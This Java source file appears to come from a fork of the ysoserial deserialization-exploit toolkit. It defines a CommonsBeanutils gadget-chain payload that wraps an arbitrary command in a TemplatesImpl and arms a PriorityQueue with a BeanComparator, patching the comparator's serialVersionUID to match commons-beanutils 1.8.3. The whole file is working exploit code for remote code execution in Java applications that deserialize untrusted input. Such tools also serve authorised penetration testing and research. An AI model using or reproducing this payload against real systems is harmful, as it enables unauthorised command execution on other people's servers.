package org.su18.ysuserial.payloads;

import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import org.su18.ysuserial.payloads.annotation.Dependencies;
import org.su18.ysuserial.payloads.util.Gadgets;
import org.su18.ysuserial.payloads.util.SuClassLoader;

import java.util.Comparator;
import java.util.PriorityQueue;

import static org.su18.ysuserial.payloads.util.Gadgets.insertField;
import static org.su18.ysuserial.payloads.util.Reflections.setFieldValue;

@SuppressWarnings({"rawtypes", "unchecked"})
@Dependencies({"commons-beanutils:commons-beanutils:1.8.3", "commons-logging:commons-logging:1.2"})
public class CommonsBeanutils2183NOCC implements ObjectPayload<Object> {

	@Override
	public Object getObject(String command) throws Exception {
		final Object templates = Gadgets.createTemplatesImpl(command);
		// 修改BeanComparator类的serialVersionUID
		ClassPool pool = ClassPool.getDefault();
		pool.insertClassPath(new ClassClassPath(Class.forName("org.apache.commons.beanutils.BeanComparator")));
		final CtClass ctBeanComparator = pool.get("org.apache.commons.beanutils.BeanComparator");

		insertField(ctBeanComparator, "serialVersionUID", "private static final long serialVersionUID = -3490850999041592962L;");

		final Comparator comparator = (Comparator) ctBeanComparator.toClass(new SuClassLoader()).newInstance();
		setFieldValue(comparator, "property", null);
		setFieldValue(comparator, "comparator", String.CASE_INSENSITIVE_ORDER);

		final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
		// stub data for replacement later
		queue.add("1");
		queue.add("1");

		setFieldValue(comparator, "property", "outputProperties");
		setFieldValue(queue, "queue", new Object[]{templates, templates});
		ctBeanComparator.defrost();
		return queue;
	}
}
